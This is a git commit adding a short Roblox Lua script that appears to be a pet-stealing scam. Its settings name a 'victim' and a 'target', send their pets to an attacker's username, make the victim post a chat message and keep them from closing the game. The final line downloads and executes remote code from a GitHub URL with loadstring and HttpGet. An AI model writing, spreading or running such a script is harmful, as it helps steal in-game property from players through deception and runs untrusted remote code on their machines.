9245d701ccc53f72ba34c2d68a7c760e94f20d3a
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-22 22:46:24 +0500

    Upload ZNX_5345.lua

---
+++ ZNX_5345.lua
@@ -0,0 +1,8 @@
+
+_G.Username = "a" --// Username To Send Pets To
+_G.GiftMessage = "b" --// Message For The Gift To Say
+_G.SendMessage = "c" --// Message the victim will send in the chat on execution
+_G.Diamonds = 1000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/ZNX_5345.lua"))()
